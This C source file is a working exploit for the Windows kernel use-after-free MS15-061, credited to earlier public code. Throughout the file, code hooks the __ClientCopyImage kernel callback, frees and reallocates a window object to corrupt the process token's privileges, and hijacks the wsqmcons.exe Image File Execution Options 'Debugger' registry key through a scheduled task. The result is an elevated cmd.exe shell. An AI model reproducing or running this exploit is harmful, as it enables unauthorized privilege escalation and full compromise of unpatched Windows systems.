#include <windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "ntos.h"

//
// MS15-061 
// bryan.alexander@fusionx.com
// Heavily adopted from 
// https://github.com/Rootkitsmm/MS15-061/blob/master/ms15-061.cpp
// and
// https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2015/august/exploiting-ms15-061-use-after-free-windows-kernel-vulnerability/
//

HWND hwnd;
HWND Secondhwnd[50];
HINSTANCE hInstance2;
CHAR originalCLS[0x5c + 2];
const WCHAR g_szClassName[] = L"MS15-061";
int SecondWindowIndex = 1;
BOOL success = FALSE;
void*  __ClientCopyImageAddress;

typedef NTSTATUS(NTAPI *pUser32_ClientCopyImage)(PVOID p);
pUser32_ClientCopyImage g_originalCCI;

typedef struct _LARGE_UNICODE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PWSTR Buffer;
} LARGE_UNICODE_STRING, *PLARGE_UNICODE_STRING;

VOID RtlInitLargeUnicodeString(
	PLARGE_UNICODE_STRING plstr,
	LPCWSTR psz,
	UINT cchLimit)
{
	ULONG Length;

	plstr->Buffer = (PWSTR)psz;
	plstr->bAnsi = FALSE;
	if (psz != NULL) {
		Length = wcslen(psz) * sizeof(WCHAR);
		plstr->Length = min(Length, cchLimit);
		plstr->MaximumLength = min((Length + sizeof(UNICODE_NULL)), cchLimit);
	}
	else {
		plstr->MaximumLength = 0;
		plstr->Length = 0;
	}
}

__declspec(naked) BOOL NTAPI NtUserDefSetText(
	IN HWND hwnd,
	IN PLARGE_UNICODE_STRING pstrText OPTIONAL
	)
{
	__asm
	{
		mov     eax, 116Dh
			mov     edx, 7FFE0300h
			call    dword ptr[edx]
			retn    8
	}
}

// wndproc
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

void
create_registry_entry()
{
	LPTSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";
	LPTSTR fpath[1024], regentry[1024];
	HKEY hkReg;
	LSTATUS status;
	DWORD sessionid;

	// fetch image path
	GetModuleFileNameA(NULL, fpath, 1024);
	ProcessIdToSessionId(GetParentProcessId(), &sessionid);
	printf("Running in session id: %d\n", sessionid);
	_snprintf(regentry, 1024, "\"%s\" %d", fpath, sessionid);
	printf("Reg entry: %s\n", regentry);

	// open reg
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		regval,
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hkReg,
		NULL) != ERROR_SUCCESS)
	{
		printf("Failed to open registry: %d\n", GetLastError());
		return;
	}

	// set
	if (RegSetValueExA(hkReg,
		"Debugger",
		0,
		REG_SZ,
		(const BYTE*)regentry,
		strlen(regentry) + 1) != ERROR_SUCCESS)
	{
		printf("Failed to set key: %d\n", GetLastError());
		RegCloseKey(hkReg);
		return;
	}

	printf("[+] Registry set, starting schtask...\n");
	system("schtasks /Run /TN \"\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator\"");
}

void
run_service(DWORD session_id)
{
	HANDLE current_token, duped_token;
	LPWSTR data[1024];
	DWORD out;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ALL_ACCESS,
		&current_token))
		return;

	// dup token
	DuplicateTokenEx(current_token, TOKEN_ALL_ACCESS, NULL, SecurityIdentification, TokenPrimary, &duped_token);

	// set session id
	SetTokenInformation(duped_token, TokenSessionId, &session_id, sizeof(DWORD));

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	CreateProcessAsUser(duped_token, L"cmd.exe", L"cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, 0, NULL, &si, &pi);
}

void
delete_registry_entry()
{
	LPTSTR regval = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wsqmcons.exe";
	HKEY hkReg;

	// open reg
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		regval,
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&hkReg,
		NULL) != ERROR_SUCCESS)
	{
		printf("Failed to open registry: %d\n", GetLastError());
		return;
	}

	if (RegDeleteKey(hkReg, regval) != ERROR_SUCCESS)
		printf("[-] Failed to delete key!\n");

	RegCloseKey(hkReg);
}

void CreateSecondWindow()
{
	WNDCLASSEX wc;
	const WCHAR g_szClassName[] = L"SecondClass";

	//Step 1: Registering the Window Class
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = NULL;
	wc.hIcon = LoadIcon(NULL, IDI_QUESTION);
	wc.hCursor = LoadCursor(NULL, IDI_QUESTION);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_QUESTION);

	if (!RegisterClassExW(&wc))
		return;

	for (int i = 0; i<50; i++)
	{
		Secondhwnd[i] = CreateWindowEx(
			WS_EX_CLIENTEDGE,
			g_szClassName,
			L"The title of my window",
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
			NULL, NULL, NULL, NULL);

		if (Secondhwnd[i] == NULL)
			return;
	}
}

NTSTATUS NTAPI hookCCI(PVOID p)
{
	LARGE_UNICODE_STRING plstr;

	// free  WND object  
	DestroyWindow(hwnd);
	UnregisterClassW(g_szClassName, NULL);

	RtlInitLargeUnicodeString(&plstr, (WCHAR*)originalCLS, (UINT)-1);
	NtUserDefSetText(Secondhwnd[SecondWindowIndex], &plstr);
	SecondWindowIndex += 1;
	return g_originalCCI(p);
}

void* Get__ClientCopyImageAddressInPEB()
{
	PTEB teb = NtCurrentTeb();
	PPEB peb = teb->ProcessEnvironmentBlock;

	// win8.1
	// return &((PVOID*)peb->KernelCallbackTable)[60];

	// win7
	return &((PVOID*)peb->KernelCallbackTable)[54];
}

//
// fetch parent process ID 
// 
DWORD GetParentProcessId()
{
	HANDLE hSnapshot;
	PROCESSENTRY32 pe32;
	DWORD ppid = 0, pid = GetCurrentProcessId();

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	__try{
		if (hSnapshot == INVALID_HANDLE_VALUE) __leave;

		ZeroMemory(&pe32, sizeof(pe32));
		pe32.dwSize = sizeof(pe32);
		if (!Process32First(hSnapshot, &pe32)) __leave;

		do{
			if (pe32.th32ProcessID == pid){
				ppid = pe32.th32ParentProcessID;
				break;
			}
		} while (Process32Next(hSnapshot, &pe32));

	}
	__finally{
		if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);
	}
	return ppid;
}

//
// use NtQuerySystemInformation to retrieve object address from process id
//
LPVOID
GetHandleAddress(ULONG dwProcessId, USHORT hObject)
{
	static BYTE HandleInformation[4096 * 16 * 16];
	DWORD BytesReturned;
	ULONG i;

	// Get handle information
	printf("[+] NtQuerySystemInformation: 0x%.8x\n",
		(UINT)NtQuerySystemInformation(16, HandleInformation, sizeof(HandleInformation), &BytesReturned));

	// Find handle
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = &HandleInfo->Handles[0];

	for (i = 0; i<HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		// Is this it?
		if (CurrentHandle->UniqueProcessId == dwProcessId &&
			CurrentHandle->HandleValue == (USHORT)hObject)
		{
			// Yep, return
			return CurrentHandle->Object;
		}
	}

	// Nope, not found
	return NULL;
}

void init()
{
	LoadLibraryA("user32.dll");
	CreateSecondWindow();

	PVOID lpvBase = VirtualAlloc((PVOID)0x0c0c0c0c, 2048, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	memset(lpvBase, '\x0c', 2048);

	memset(originalCLS, 0, 0x5c + 2);
	memset(originalCLS, '\x0c', 0x5c);
}

int 
ms15_061(int argc, char **argv)
{
	HANDLE current_token;
	LPVOID _TOKEN;
	USHORT uToken;
	ULONG startTokenOffset;

	WNDCLASSEX wc;
	int x;
	DWORD prot;
	MSG Msg;

	if (argc > 1)
	{
		DWORD sid;
		ProcessIdToSessionId(GetCurrentProcess(), &sid);
		run_service(_wtoi(argv[1]));
		return;
	}

	// fetch process token
	if (!OpenProcessToken(OpenProcess(PROCESS_QUERY_INFORMATION, 1, GetParentProcessId()), TOKEN_QUERY | TOKEN_QUERY_SOURCE, &current_token)){
		printf("[-] Failed to open current process token! %d\n", GetLastError());
		return -1;
	}

	// fetch token information
	uToken = (USHORT)current_token & 0xffff;
	_TOKEN = GetHandleAddress(GetCurrentProcessId(), uToken);
	printf("[+] Current token address: %08x\n", (USHORT)_TOKEN);

	startTokenOffset = (ULONG)_TOKEN + 0x40;
	printf("[+] _SEP_TOKEN_PRIVILEGES at %08x\n", startTokenOffset);

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = NULL;
	wc.hIcon = NULL; // bypass  check  inside xxxSetClassIcon to lead  execution path to callback  
	wc.hCursor = NULL; // bypass  check  inside xxxSetClassIcon to lead  execution path to callback  
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm = NULL; // bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback  

	init();

	// fetch __ClientCopyImage
	__ClientCopyImageAddress = Get__ClientCopyImageAddressInPEB();

	// mark it as writable
	if (!VirtualProtect(__ClientCopyImageAddress, sizeof(PVOID), PAGE_EXECUTE_READWRITE, &prot))
		return;

	// overwrite callback addr with our hooked userland func
	g_originalCCI = (pUser32_ClientCopyImage)InterlockedExchangePointer((volatile PVOID*)__ClientCopyImageAddress, &hookCCI);

	// reset protection
	if (!VirtualProtect(__ClientCopyImageAddress, sizeof(PVOID), prot, &prot))
		return;

	// setup address to dec
	*(DWORD *)(originalCLS + 0x58) = (startTokenOffset + 8) - 0x4;

	//
	// we just need a single trigger
	//

	if (!RegisterClassExW(&wc))
		return 0;

	// Step 2: Creating the Window
	hwnd = CreateWindowEx(
		WS_EX_CLIENTEDGE,
		g_szClassName,
		L"The title of my window",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
		NULL, NULL, NULL, NULL);

	if (hwnd == NULL)
		return 0;

	ShowWindow(hwnd, NULL);
	UpdateWindow(hwnd);

	//Triger UserMode CallBack 
	//DebugBreak();
	SetClassLongPtr(hwnd, GCLP_HICON, (LONG_PTR)LoadIcon(NULL, IDI_QUESTION));
	SendMessageW(Secondhwnd[0], WM_NULL, NULL, NULL);

	// create registry entry and purge
	create_registry_entry();
	delete_registry_entry();

	// 0x004240f0 : pop ebx; pop esi; ret
	// 0x0042da5b : pop eax; mov dword ptr[esi], eax; ret

}